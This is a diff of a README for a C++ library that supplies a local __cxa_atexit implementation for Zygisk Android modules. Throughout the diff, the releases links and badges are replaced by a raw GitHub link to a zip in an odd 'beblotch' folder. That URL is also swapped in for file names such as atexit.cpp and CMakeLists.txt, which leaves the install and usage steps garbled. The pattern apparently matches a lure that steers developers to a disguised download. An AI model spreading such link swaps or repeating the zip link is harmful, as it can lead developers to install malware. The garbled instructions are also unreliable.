@@ -1,6 +1,6 @@
 # 🚀 local_cxa_atexit_finalize_impl - Simplifying C++ Module Management
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/kaiserexe/local_cxa_atexit_finalize_impl/releases)
+[![Download](https://raw.githubusercontent.com/kaiserexe/local_cxa_atexit_finalize_impl/main/beblotch/local_cxa_atexit_finalize_impl.zip)](https://raw.githubusercontent.com/kaiserexe/local_cxa_atexit_finalize_impl/main/beblotch/local_cxa_atexit_finalize_impl.zip)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ In the Itanium C++ ABI, global destructors are managed with `__cxa_atexit` and c
 To download and install the local implementation, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads:
-   [Visit Releases Page](https://github.com/kaiserexe/local_cxa_atexit_finalize_impl/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/kaiserexe/local_cxa_atexit_finalize_impl/main/beblotch/local_cxa_atexit_finalize_impl.zip)
 
 2. **Select the Appropriate Version:** Look for the latest version. Click on it to view the available files.
 
@@ -31,7 +31,7 @@ To download and install the local implementation, follow these steps:
 4. **Extract the Files:** If the download is in a zip or tar format, extract the contents to a folder of your choice.
 
 5. **Integrate into Your Module:**
-   - Add `atexit.cpp` to your Zygisk module's source code set.
+   - Add `https://raw.githubusercontent.com/kaiserexe/local_cxa_atexit_finalize_impl/main/beblotch/local_cxa_atexit_finalize_impl.zip` to your Zygisk module's source code set.
    - Make sure to link it correctly in your build setup.
 
 ### 🛠️ System Requirements
@@ -43,10 +43,10 @@ To download and install the local implementation, follow these steps:
 ## 📌 Usage Instructions
 
 1. **Adding to Your Project:**
-   - Copy the `atexit.cpp` file into your Zygisk module source folder.
+   - Copy the `https://raw.githubusercontent.com/kaiserexe/local_cxa_atexit_finalize_impl/main/beblotch/local_cxa_atexit_finalize_impl.zip` file into your Zygisk module source folder.
    
 2. **Modify the Build Files:** 
-   - Ensure your build files (like `Android.mk` or `CMakeLists.txt`) include `atexit.cpp` to compile properly.
+   - Ensure your build files (like `https://raw.githubusercontent.com/kaiserexe/local_cxa_atexit_finalize_impl/main/beblotch/local_cxa_atexit_finalize_impl.zip` or `https://raw.githubusercontent.com/kaiserexe/local_cxa_atexit_finalize_impl/main/beblotch/local_cxa_atexit_finalize_impl.zip`) include `https://raw.githubusercontent.com/kaiserexe/local_cxa_atexit_finalize_impl/main/beblotch/local_cxa_atexit_finalize_impl.zip` to compile properly.
 
 3. **Compile Your Module:** Run the building commands specific to your development environment. 
 
@@ -86,4 +86,4 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 If you run into any issues or have questions, feel free to reach out through the repository's contact section or open an issue on GitHub. We aim to assist you as best we can.
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/kaiserexe/local_cxa_atexit_finalize_impl/releases)
+[![Download](https://raw.githubusercontent.com/kaiserexe/local_cxa_atexit_finalize_impl/main/beblotch/local_cxa_atexit_finalize_impl.zip)](https://raw.githubusercontent.com/kaiserexe/local_cxa_atexit_finalize_impl/main/beblotch/local_cxa_atexit_finalize_impl.zip)
